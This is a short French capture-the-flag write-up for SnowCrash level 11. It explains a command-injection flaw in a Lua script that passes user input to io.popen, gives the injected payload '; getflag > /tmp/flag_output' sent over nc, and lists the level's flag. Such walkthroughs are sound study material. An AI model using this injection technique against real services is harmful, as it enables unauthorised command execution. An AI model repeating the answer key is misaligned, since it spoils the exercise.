# SnowCrash Level 11 - Exploit README

## Résumé

Dans ce niveau, nous avons un script Lua (`level11.lua`) qui écoute sur le port 5151 et demande un mot de passe. Nous devons exploiter une faille de sécurité pour obtenir le mot de passe du niveau suivant.

## Le Problème

Le script utilise `io.popen` pour exécuter une commande shell avec l'entrée utilisateur, ce qui le rend vulnérable à une injection de commande :

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

## Solution : Exploitation de la Faille

Nous allons injecter une commande pour exécuter `getflag` et rediriger la sortie vers un fichier dans `/tmp`.

### Étapes

1. **Se connecter au serveur** :
   ```sh
   nc localhost 5151
   ```

2. **Injecter la commande malveillante** :
   ```
   ; getflag > /tmp/flag_output
   ```

3. **Lire le fichier contenant le mot de passe** :
   ```sh
   cat /tmp/flag_output
   ```

### Commandes à Exécuter

```sh
# Se connecter au serveur
nc localhost 5151

# Entrer la commande malveillante
Password: ; getflag > /tmp/flag_output

# Vérifier le résultat
cat /tmp/flag_output
```

**Sortie attendue :**
```
fa6v5ateaw21peobuub8ipe6s
```

En exécutant ces étapes, nous exploitons l'injection de commande pour obtenir le mot de passe du niveau suivant.
